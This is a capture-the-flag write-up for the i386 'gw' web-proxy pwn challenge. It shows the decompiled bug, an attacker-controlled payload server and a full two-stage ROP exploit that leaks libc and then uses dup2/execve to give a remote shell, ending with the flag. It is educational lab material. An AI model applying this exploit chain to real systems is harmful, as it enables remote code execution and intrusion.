# gw

[library.m0unt41n.ch/challenges/gw](https://library.m0unt41n.ch/challenges/gw) ![](../../resources/pwn.svg) ![](../../resources/medium.svg) 

# TL;DR

We get a `GW` binary and a `libc-2.27.so`. Challenge text provides following hints:

> *Hint: `memcpy @ filter_message`*<br>
> *Use the docker image `i386/ubuntu:18.04` to debug your exploit.*<br>
> *And use `inet_ntoa` to calculate the libc address. ;)*

# Initial setup

Just running the program:

```shell
$ ./GW
home:~/work/ctf/shc/gw: ./GW 
STARTING GW TEST SYSTEM
[...] BINDING
[...] LISTENING

$ netstat -tapn
tcp    0    0 0.0.0.0:8080    0.0.0.0:*    LISTEN    1105253/./GW        
```

So, the program is listening on port `8080`. Following the second hint
(`i386/ubuntu:18.04`), let's create a small [Dockerfile](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/gw/Dockerfile) for it:

```Dockerfile
FROM i386/ubuntu:18.04

RUN apt-get update
RUN apt-get install -y python3-pip python3-dev git libssl-dev libffi-dev \
                       gdb git wget vim locales socat lsof \
                       build-essential pkg-config rustc cargo libssl-dev
RUN python3 -m pip install --upgrade pip
RUN pip install --upgrade pip
RUN python3 -m pip install --upgrade pwntools
RUN git clone --branch 2023.07.17 https://github.com/pwndbg/pwndbg  ~/pwndbg
RUN cd ~/pwndbg && ./setup.sh
RUN echo "set startup-quietly on" >~/.gdbearlyinit
RUN echo "source ~/pwndbg/gdbinit.py\n\
set show-tips off\n\
set max-visualize-chunk-size 192\n\
set debuginfod enabled off\n\
set breakpoint pending on\n" >~/.gdbinit
RUN echo "export LC_CTYPE=C.UTF-8" >>~/.bashrc
RUN apt-get install -y lsof

COPY GW /root
COPY filter.py /root
RUN chmod +x /root/GW
ENTRYPOINT ["/bin/bash"]
EXPOSE 8080
```

As usual, I include my snippet for
[pwndbg](https://browserpwndbg.readthedocs.io/en/docs/) and some useful tools.

Let's run it and check if we got the right glibc:

```shell
$ docker build -t gw .
$ docker run -it -p 127.0.0.1:8080:8080 gw:latest
$ docker container exec -it $(docker ps -q) /bin/bash
```

Double-check libc version:

```shell
$ md5sum libc-2.27.so 
    a2635477e1a5a5a46b30abde0b56a270  libc-2.27.so
$ docker container exec -it $(docker ps -q) /bin/bash
$ ldd /root/GW
    (...)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d96000)
$ md5sum /lib/i386-linux-gnu/libc.so.6
a2635477e1a5a5a46b30abde0b56a270  /lib/i386-linux-gnu/libc.so.6
```

# Initial analysis

The binary has `noexec` stack, but otherwise, all protections seem disabled
(and we get some symbols):

```shell
$ checksec --file=GW
RELRO     STACK CANARY     NX          PIE     RPATH     RUNPATH     Symbols     FORTIFY
No RELRO  No canary found  NX enabled  No PIE  No RPATH  No RUNPATH  93 Symbols  No
```

## Decompilation

IDA was somehow not happy about some parts of this code - I used Ghidra
instead. A somewhat reasonable (it compiles!) and heavily annotated result:
[GW.c](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/gw/GW.c). The program seems to have multiple bugs related to handling end
of string.

## Program flow

The program creates a server at port `8080` and, for each incoming connection,
starts a thread running `connection_handler()`.

### `connection_handler()`

*   Read the entire request (up to 10240 bytes)
*   Do various sanity checking, to ensure it is a valid request of a form:
    *   `GET http://address.domain/urlpath...\r\n`
    *   (...)
    *   `Host: somename\r\n`, optionally with `:port` suffix (default is `80`).
        Max length of the `Host` field is 100 characters.
    *   (...)
    *   `\r\n\r\n`
*   The `address.domain` part is mostly **ignored**.
*   Resolve the `Host:` hostname into a `struct hostent *host`.
*   Log the resulting IP on the console, use `inet_ntoa()` which is supposedly
    related to the vulnerability.
*   Then, make a HTTP request to above IP/port, sending:
    *   `GET /urlpath...\r\n` (note that will include `HTTP/1.1`)
    *   ... and everything in the original request that follows.
*   Reads the response. If it does not contain `<message>`, just send it back
    to the client verbatim (incl. headers etc).
*   ... if it does though:
    *   Check for `</message>` too
    *   Extract the message between these two tags (max 4000 bytes) into
        `messageBuf`
    *   Create `strResponse` buffer, twice the size of that message length
    *   Run `filter_message(messageBuf, messageLen, strResponse)`
    *   Run `send_http_response(fd, "200 OK", strResponse)`

To summarize: this is a HTTP proxy, with a twist: if it detects
`<message>...</message>` in the response, it will, instead of proxying it, do
some processing and `send_http_response()` with the result instead.

### `send_http_response()`

Given a `text`, sends a simple HTTP response, wrapping it up in a `<pre></pre>`
container. Use `strHttpCode` provided as a string argument:

```
HTTP/1.1 [code]
Server: GW SERVER
Content-Length: [len]
Connection: close
Content-Type: text/html; charset=UTF-8

<html><head><title>GW</title></head><body><pre>[text]</pre></body></html>
```

(`[len]` is properly calculated, based on `text` and HTML template).

### `filter_message()`

Take a buffer (`src` / `len`), send it to `0.0.0.0:6666`, return the result
(up to `len * 2`) in the `dest` buffer. Then, also copy it to a locally
allocated `buf[]`:

```c
void filter_message(char *src, size_t len, char *dest) {
    char buf[1024];
    struct sockaddr_in addr;
    
    printf("[+] FILTERING MESSAGE: %s\n", src);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("0.0.0.0");
    addr.sin_port = htons(6666);
    int fd = socket(AF_INET, SOCK_STREAM, SOL_IP);
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr))) {
        puts("[-] FILTER SERVER CONNECTION FAILED\n");
    } else {
        send(fd, src, len, 0);
        read(fd, dest, len * 2);
        close(fd);
        printf("[+] FILTERED MESSAGE: %s\n", dest);
        memcpy(buf, src, len);
    }
}
```

Two important observations:

*   **Note a buffer overflow error**. We know that the filtered message can
    be up to 8000 bytes long, but we only allocate a 1024b buffer.
*   **We have no idea what the filter server does** &#128577;

### `find()`

```c
find(char *str, int startPos, int strLen, char *subStr, int subStrLen)
```

Finds first occurence of `substr`/`subStrLen` in `str`/`strLen`, starting at
`startPos`. It has a subtle error that it will actually try to search *after*
`strLen` - but, as long as we don't cross memory segment boundary, that should
be harmless.

### `decrypt_ssl()`

Prints some text. It will never be called directly as, in `main()` it is
wrapped in:

```c
int port = 8080;
if (port == 443)
    decrypt_ssl();
```

Perhaps the idea is to call it indirectly as part of exploitation?

## "Filter" server.

We don't have access to the mysterious `0.0.0.0:6666` on the remote instance.
But we can try poking it. If we put a file with known `<message>...</message>`
pattern, at a known, public URL, we can see what will the remote proxy do with it.

```bash
HOST=myhost.com
PATH=file
(
  echo -e "GET http://$HOST/$PATH HTTP/1.1\r"
  echo -e "Host: $HOST\r"
  echo -e "Accept-Encoding: identity\r"
  echo -e "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r"
  echo -e "User-Agent: wget2/2.1.0\r"
  echo -e "Connection: keep-alive\r"
  echo -e "\r"
) | /usr/bin/nc library.m0unt41n.ch 30670
```

The proxy was somewhat picky about the server choice.
[pastebin.com](http://pastebin.com) outright did not work, because it uses
HTTPS redirection. But I found [logpaste.com](http://logpaste.com) which does
not - and yet, I got `Failed resolving hostname!` too!

But, I eventually was able to put the file in my personal website and, with
that, I established that the "filter" is *largely* down to identify function,
except:

*   It stops at first `\0` byte in the message
*   It occasionally leaks some unintended data, e.g. parts `hosts` file
*   For a single/double-byte messages, it returns extra character (or two) of
    garbage

The proxy itself, is not error-free either, occasionally returning some garbage
before the `<html>` response template. OTOH, it's possible that **all** these
issues are coming from the proxy code itself.

> **Spoiler alert**: the filter is actually *not* that simple &#128578; But, for the
> purpose of this challenge, this was a good enough approximation. See more
> details [at the end](#real_filter).

# Tools

## Local filter server

With above assumption (*"the filter cuts messages to first zero*") we need one
in our local container. I wrote [filter.py](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/gw/filter.py):

```python
from socket import *

sock = socket(AF_INET, SOCK_STREAM)
sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 6666))
sock.listen(1)
while True:
    print("\n[FILTER AWAITING CONNECTIONS]")
    (con, client) = sock.accept()
    print("[FILTER CONNECTION FROM:", client,"]")
    data = con.recv(10240)
    if len(data)==0:
        con.close()
        print("Connection closed")
        break
    print("[FILTER RECEIVED: ", data, "]")
    for i in range(len(data)):
        if data[i]==0:
            data = data[:i]
            break
    print("[FILTER SENDING BACK: ", data, "]")
    con.send(data)
    con.close()
```

> **NOTE: This needs to be added to the `Dockerfile` and has to be up whenever
> we run a local instance of the challenge!**

## Remote webserver

The challenge needs to talk to *"the internet"* and we have to control the
contents of that conversation. While this can be exercised locally with, e.g.,
`python -m http.server 80`, considering how sensitive the buggy code is to
variations in naming (length etc), it makes sense to consistently use the same
place.

I started an AWS instance, with following [server.py](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/gw/server.py) script:

```python
import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(('0.0.0.0', 80))
server_socket.listen(1)

while True:
    connection, client_address = server_socket.accept()
    data = connection.recv(10240)
    reply = b"Move along, nothing to see here"
    if b"message:" in data:
        data = data[data.find(b"message:")+len(b"message:"):]
        data = data[:data.find(b':')].decode('ascii')
        reply = b' <message>'+bytes.fromhex(data)+b'</message> '
    print("Sending: "+repr(reply))
    connection.sendall(reply)
    connection.close()
```

Idea: by now we know that we only care about "messages". The server will take
a `message:HEXSTRING:` as URL param and send back a message with that string
decoded as binary. This possibly means long URLs, but that's fine - our buffers
there are up to 10KB and the interesting *messages* will be around 1KB, thus,
2KB in hex.

BTW, spaces around ` <message>...</message> ` are one of many examples of buggy
`connection_handler()`. If I remove them, half of the calls return
`Can't resolve hostname`. I never got to the botton why.

> **IMPORTANT: Through the rest of this write-up, we assume that the remote
> server is up and running, at a known address / port (e.g. an AWS instance)**.


# Pain and suffering

I've spent **way, way, way** too much time in dead ends here &#128577;
    
Fun fact: some of the minor successes listed below, if put together, they
would've eventually make for a working exploit. It's just that I never had all
the right pieces working at *one time* &#128512;

## *"Payload can't have zeros"*

While buffer overflow is evident, for long time I thought that if "filter
server" cuts the string at the first `\0`, it means that my payloads can't
have zeros. Only at some point I noticed that `buf` in `filter_message()` is
actually *not used at all* and receives the full *input* message (incl. zeros)

BTW, I even managed to have a "zero-free payload" at some point &#128578; (mostly
down to sequences of `mov`/`inc`/`inc`/`inc` gadgets)

## Exploiting string handling bugs

I spent way too much trying to understand and exploit the "non-message" code
flow. The code is quite buggy and operates on strings defined as (ptr, len),
without explicit zero-termination. This leads to many cases where previous
memory contents is appended to proxy request / response. And for long time I
thought that this *must* be the place that I have to exploit.

Fun facts about this rathole:

*   Sometimes the best place to detect the address was on the webserver. I had
    a state machine there, which, depending on whether we got a libc already,
    returned different responses to a client-side exploit.
*   With a ton of over-engineering, I even had success leaking *some* addresses
    this way. **Predictably** even! - by saving sequences of randomized
    hostnames / payloads and replaying one(s) that worked.

## Unpredictable FDs

While the nature of final payload (ROP, `dup2()` FD's from socket into
`stdin`/`stdout`, `exec()` a shell) was clear from the start, for long time I
could not get the FD for the current connection.

I actually had a very cute, three-step workaround for that:

*   Start the **second** payload exploit (getting remote shell) first, but
    **pause it** once the connection is open. This way we know that it will
    have `sockfd=4`.
*   Start the **first** payload exploit, leak the libc, in a way that does not
    need `sockfd`.
*   Pass the libc to the first exploit somehow and let it continue with
    the shell payload.

It might have been cute, but definitely not simple...

## *"use inet_ntoa to get libc leak"*

I spent too much time trying to take the *"use `inet_ntoa`"* hint too
literally. First, wondering how to explicitly grab the return value. Then,
trying to craft the payload (hostname) so that `malloc`/`free` sequence will
reuse a memory block that has the leak and return it in the response.

I had success there too! While I could not leak `inet_ntoa` buffer this way,
there was another one that worked. TL;DR from my notes:

*   For a hostname of 99 bytes
*   ... and a `<message>` of 174 bytes
*   ... consisting of 56 `A`'s and then, zeros
*   ... we get a leak of another value, with fixed offset vs libc.

(I did not keep the code doing that though)

<a name="ret2libc_on_i386"></a>

## ret2libc ROP in i386

I tried crafting ret2libc-style payload first, and could not get it to work
remotely. I forgot that i386 the *caller* has to cleanup the stack arguments
from the stack. So, ROP chain has to deal with extra dwords and have a way to
skip them when returning to the next step.
 
So, for a 2-argument function, we need a sort of `add esp, 8` gadget. We have
that in libc  (`0x0002c505`) and in `GW` we have an almost-equivalent
`pop edi ; pop ebp ; ret`. So, e.g. ROP chain for `dup2()` would be:

```python    
rop2 += pwn.p32(dup2)
rop2 += pwn.p32(add_esp_8)
rop2 += pwn.p32(sockfd)
rop2 += pwn.p32(0)
```

... but figured all this out way too late.

# Actually working exploit

**TL;DR**: `GW` binary does not have enough gadgets for a full ROP - but it has
just enough to leak the libc. Therefore, the plan is:

1.  Leak the libc using a ROP from the `GW` binary offsets (fixed, no ASLR):
    *   Make `filter_message` return to `send_http_error` with `text` pointing
        to `inet_ntoa` offset (provides a libc leak in HTTP response).
    *   Make sure that, once done, the code does not crash. An infinite loop
        would be idea, but, failing that: `read()` from `stdin`, writing to a
        known-safe buffer in the BSS. And hope it hangs there.
2.  Use libc gadgets to craft a "proper" remote shell ROP:
    *   Redirect process standard I/O to the connected socket:
        `dup2(sockfd, stdin)`, `dup2(sockfd, stdout)`, `dup2(sockfd, stderr)`
    *   Run a shell: `execve("/bin/sh", NULL, NULL)`

Note that this requires keeping a close track of file descriptors. With
`lsof -p $(pgrep GW)` we can establish that the first connection will be
accepted with `sockfd=4` and the following ones... it depends &#128512; but, once
the exploit stabilized, the second connection was consistently `sockfd=5`.

BTW, `inet_ntoa` has nothing to do with the hint in the challenge - it could
be any other libc function that is dynamically linked to the binary.

Let's start the exploit:

```python
#!/usr/bin/python3
from pwn import *
context.update(arch='i386', os='linux', log_level='warning')

WEBSERVER=b"ec2-3-82-2-207.compute-1.amazonaws.com:80"

# REMOTE=('library.m0unt41n.ch', 31241, 'ipv4', 'tcp', False)
REMOTE=('127.0.0.1', 8080, 'ipv4', 'tcp', False)
```

## Getting offsets for the first ROP

*   `send_http_error` offset: **0x08048c35**

    ```
    $ objdump -t GW | grep send_http_error
    08048c35 g     F .text	00000045              send_http_error
    ```

*   *"pop + pop"* gadget: **0x08048c32**

    ```bash
    $ ROPgadget --binary GW | grep ": pop e.. ; pop e.. ; ret"
    0x08048c32 : pop edi ; pop ebp ; ret
    0x08049435 : pop esi ; pop ebp ; ret
    ```

*   `inet_ntoa` in GOT: **0x804aed8** (note: we need to pull it from GOT in
    runtime, that's where we get our libc leak from)

    ```bash
    objdump -d -j .plt GW | grep -A3 inet_ntoa
    08048640 <inet_ntoa@plt>:
     8048640:	ff 25 d8 ae 04 08    	jmp    *0x804aed8
     8048646:	68 28 00 00 00       	push   $0x28
     804864b:	e9 90 ff ff ff       	jmp    80485e0 <.plt>
    ```

*   `read` in PLT: **0x08048600** (here we just need a place to jump to, so, a
    fixed PLT offset is fine)

    ```bash
    $ objdump -d -j .plt GW | grep -A3 read@plt
    08048600 <read@plt>:
     8048600:	ff 25 c8 ae 04 08    	jmp    *0x804aec8
     8048606:	68 08 00 00 00       	push   $0x8
     804860b:	e9 d0 ff ff ff       	jmp    80485e0 <.plt>
    ```

*   Some safe random R/W buffer to write to - the unused `TOP SECRET` message
    sounds about right: **0x804a670**:

    ```
    pwndbg> search -w "TOP SECRET"
    Searching for value: 'TOP SECRET'
    GW      0x804a670 'TOP SECRET - DO NOT INVESTIGATE - GW-CLEARANCE NEEDED'
    ```

We also know that, for the first payload, we will be talking to `sockfd=4`.

## Leaking the libc

With that, the first ROP payload is:

```python
sockfd = 4
rop1 = 1024*b'D' + 32*b'U'  # overflow buf, addr, fd, EBP and padding
rop1 += p32(0x08048c35)     # send_http_error
rop1 += p32(0x08049435)     # where we want send_http_error to return (pop+pop gadget)
rop1 += p32(sockfd)         # fd
rop1 += p32(0x0804aed8)     # inet_ntoa() in GOT
rop1 += p32(0x08048600)     # read() in PLT
rop1 += p32(0xBABEBABE)     # something dummy
rop1 += p32(0x00000000)     # STDIN_FILENO
rop1 += p32(0x0804a670)     # safe buffer("TOP SECRET" string)
rop1 += p32(0x00000010)     # count
```

We can now send it:

```python
io = remote(*REMOTE)
req = b"GET http://blah/hex_message:"+rop1.hex().encode('ascii')+b": HTTP/1.0\r\n"
req += b"Host: "+WEBSERVER+b"\r\n\r\n"
io.send(req)
b = io.recv(10240)
io.close()
```

Looking at `send_http_response()` we expect this to return:

```html
HTTP/1.1 400 Bad Request\r
Server: GW SERVER\r
Content-Length: 106\r
Connection: close\r
Content-Type: text/html; charset=UTF-8\r
\r
<html><head><title>GW</title></head><body><pre>\x01\x32\x54\x76</pre></body></html>
```

... where `0x76543210` is the runtime offset to `inet_ntoa()`. Which it *almost*
does &#128578; - yet another bug in the code introduces few extra zeros before
`<html>`. In any case, with a known offset if `inet_ntoa` inside libc
(**0x00109d10**):

```bash
$ objdump -T libc-2.27.so  | grep inet_ntoa
00109d10 g    DF .text	0000004d  GLIBC_2.0   inet_ntoa
```

... this is enough to extract the libc:

```python
pos = b.find(b'<body><pre>')+len(b'<body>pre>')+1
inet_ntoa = b[pos]+(b[pos+1]<<8)+(b[pos+2]<<16)+(b[pos+3]<<24)
glibc = inet_ntoa - 0x00109d10
print("glibc: "+hex(glibc))
```

## Getting the `syscall` gadget

I stumbled a bit because a) I had hard time doing ret2libc here (see
[above](#ret2libc_on_i386)) b) if I wanted a syscall-based ROP instead, I
could not get a clean `syscall ; ret` gadget. But, when looking at `dup2()`
code, I noticed something almost as good:

```
$ objdump -M intel -d libc-2.27.so | grep -A9 dup2 
(...)
000e7950 <__dup2@@GLIBC_2.0>:
   e7950:	89 da                	mov    edx,ebx
   e7952:	8b 4c 24 08          	mov    ecx,DWORD PTR [esp+0x8]
   e7956:	8b 5c 24 04          	mov    ebx,DWORD PTR [esp+0x4]
   e795a:	b8 3f 00 00 00       	mov    eax,0x3f
   e795f:	65 ff 15 10 00 00 00 	call   DWORD PTR gs:0x10
   e7966:	89 d3                	mov    ebx,edx
   e7968:	3d 01 f0 ff ff       	cmp    eax,0xfffff001
   e796d:	0f 83 1d 17 f3 ff    	jae    19090 <__libc_start_main@@GLIBC_2.0+0x1e0>
   e7973:	c3                   	ret
```

`call DWORD PTR gs:0x10` jumps into [VDSO](https://en.wikipedia.org/wiki/VDSO)
and there:

```
pwndbg> disassemble *0xf7f98580,+16
0xf7f98580 <__kernel_vsyscall>       push   ecx
0xf7f98581 <__kernel_vsyscall+1>     push   edx
0xf7f98582 <__kernel_vsyscall+2>     push   ebp
0xf7f98583 <__kernel_vsyscall+3>     mov    ebp, ecx
0xf7f98585 <__kernel_vsyscall+5>     syscall 
0xf7f98587 <__kernel_vsyscall+7>     int    0x80
0xf7f98589 <__kernel_vsyscall+9>     pop    ebp
0xf7f9858a <__kernel_vsyscall+10>    pop    edx
0xf7f9858b <__kernel_vsyscall+11>    pop    ecx
0xf7f9858c <__kernel_vsyscall+12>    ret    
```

The `syscall ; int 0x80` combo seems unusual - this is VDSO's mechanism to have
fast system calls, with a backwards compatibility. Tracing it with GDB, we see
that `syscall` returns to `pop ebp`.

Overall, as long as there are no errors, **0x000e795f** should be a good proxy
for a `syscall ; ret` gadget.

## Getting other gadgets for the second ROP

```bash
$ ROPgadget --binary=libc-2.27.so | grep -E ': pop e[abcd]x ; ret$' 
0x00024e1e : pop eax ; ret
0x00018d05 : pop ebx ; ret
0x00192891 : pop ecx ; ret
0x00001aae : pop edx ; ret

$ ROPgadget --binary=libc-2.27.so --string "/bin/sh"
0x0017e1db : /bin/sh
```

## Getting a remote shell

We now have all pieces for the second ROP payload:

```python
sockfd = 5
rop2 = 1024*b'D' + 32*b'U'
# sys_dup2(sockfd, STDIN_FILENO)
rop2 += p32(pop_eax) + p32(63)
rop2 += p32(pop_ebx) + p32(sockfd)
rop2 += p32(pop_ecx) + p32(0)
rop2 += p32(syscall)
# sys_dup2(sockfd, STDOUT_FILENO)
rop2 += p32(pop_eax) + p32(63)
rop2 += p32(pop_ebx) + p32(sockfd)
rop2 += p32(pop_ecx) + p32(1)
rop2 += p32(syscall)
# sys_dup2(sockfd, STDERR_FILENO)
rop2 += p32(pop_eax) + p32(63)
rop2 += p32(pop_ebx) + p32(sockfd)
rop2 += p32(pop_ecx) + p32(2)
rop2 += p32(syscall)
# sys_execve("/bin/sh", NULL, NULL)
rop2 += p32(pop_eax) + p32(11)
rop2 += p32(pop_ebx) + p32(bin_sh)
rop2 += p32(pop_ecx) + p32(0)
rop2 += p32(pop_edx) + p32(0)
rop2 += p32(syscall)
```

And we can send it:

```python
req = b"GET http://blah/hex_message:"+rop2.hex().encode('ascii')+b": HTTP/1.0\r\n"
req += b"Host: "+WEBSERVER+b"\r\n\r\n"
io = remote(*REMOTE)
io.send(req)
io.interactive()
```

... which works, including the remote instance:

```
$ id -a
uid=1001(GW) gid=1001(GW) groups=1001(GW)
$ uname -a
Linux gw 5.15.0-122-generic #132-Ubuntu SMP Thu Aug 29 13:45:52 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
$ ps auxwww
USER     PID %CPU %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND
root       1  0.0  0.0   2496  1348 ?    Ss   18:38   0:00 /bin/sh /entrypoint.sh
root      12  0.0  0.0   3752  2356 ?    Ss   18:38   0:00 /usr/sbin/cron
root      13  0.3  0.0  19504 14772 ?    S    18:38   0:00 /usr/bin/python /usr/bin/supervisord
AI        16  0.4  0.1  46980 30196 ?    S    18:38   0:00 python3 /home/AI/filter.py
GW        17  0.0  0.0   2496  1324 ?    S    18:38   0:00 
GW        42  0.0  0.0   5464  2588 ?    R    18:39   0:00 ps auxwww
$ cd /home
$ ls
AI
GW
$ cd /home/GW
$ ls -l
total 16
-r-x--x--x 1 GW   GW   11956 May 30 22:28 GW
-r-------- 1 GW   GW      44 May 30 22:28 flag
$ cat flag
shc2023{pwn3d_th3_p4tr10ts_w3b_pr0xy_fd_r0p}$  
```

Full exploit: [exploit.py](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/gw/exploit.py).

<a name="real_filter"></a>

# Remote container

Note that the remote container has some more things. In above `ps` output, we
see `python3 /home/AI/filter.py`. That is our secret "filter" which is actually
**not** as simple as cutting the input at first zero, but luckily that wasn't
a problem for solving this challenge.

That filter is in fact part of a
[different challenge](https://library.m0unt41n.ch/challenges/ai), together
with an `AI` binary and a different flag:

```
$ ls -l /home/AI
total 16
-r-x---r-- 1 AI AI 5556 May 30 22:28 ai
-r-x--xr-x 1 AI AI 3764 May 30 22:28 filter.py
-r-------- 1 AI AI   38 May 30 22:28 flag
```

---

## `shc2023{pwn3d_th3_p4tr10ts_w3b_pr0xy_fd_r0p}`

<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
